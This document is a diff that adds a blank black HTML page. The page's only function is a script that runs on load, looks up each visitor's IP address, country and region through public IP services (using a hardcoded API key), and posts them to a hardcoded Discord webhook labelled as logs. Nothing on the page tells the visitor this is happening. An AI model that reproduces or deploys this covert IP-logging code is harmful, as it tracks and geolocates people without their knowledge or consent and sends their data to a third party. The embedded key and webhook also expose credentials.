@@ -1,0 +1,43 @@
+<html>
+<head>
+<script type="text/javascript">
+
+
+function getIP(json) {
+    function json(url) {
+    return fetch(url).then(res => res.json());
+    }
+    
+    let apiKey = '63bec30bbebaa69d56dc4e1aea18ab0d40db15b46f4a9040ea6a2ff2';
+    json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
+
+    // so many more properties
+
+     var request = new XMLHttpRequest();
+     
+     request.open("POST", "https://discord.com/api/webhooks/901748988582166538/4YUpPsHwcmVg2s7VAOzUsdkAQoIzIApg7V4zaptng8phT4s2N1iZt1JEVgwtYSybfYbm");
+     
+     request.setRequestHeader('Content-type', 'application/json');
+     
+     var params = 
+     {
+          username: "ehub.fun logs",
+          avatar_url: "",
+          content: "IP:  " + data.ip + "**         **" +  "Country:  " + data.country_code +  "**         **" + "Region:  " +  data.region
+     }
+     
+     request.send(JSON.stringify(params));
+    });
+}
+
+</script>
+<style>
+    *{
+        background-color: black;
+    }
+</style>
+</head>
+<script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+<body onload="getIP()">  
+</body>
+</html>
